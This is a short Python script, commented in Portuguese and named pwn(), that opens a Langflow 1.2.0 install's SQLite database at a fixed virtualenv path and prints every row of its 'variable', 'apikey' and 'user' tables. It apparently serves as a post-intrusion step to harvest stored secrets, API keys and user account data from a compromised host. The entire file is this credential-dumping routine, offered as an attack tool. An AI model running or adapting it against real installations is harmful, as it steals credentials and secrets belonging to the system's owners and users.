import sqlite3

db = '/opt/langflow-1.2.0-venv/lib/python3.12/site-packages/langflow/langflow.db'

def pwn():
    try:
        conn = sqlite3.connect(db)
        cur = conn.cursor()
        
        # Tabelas que queremos vasculhar
        targets = ['variable', 'apikey', 'user']
        
        for table in targets:
            print(f"\n--- [ TABELA: {table.upper()} ] ---")
            cur.execute(f"SELECT * FROM {table};")
            rows = cur.fetchall()
            if not rows:
                print("Vazia.")
            for r in rows:
                print(r)
                
    except Exception as e:
        print(f"Erro: {e}")

if __name__ == "__main__":
    pwn()
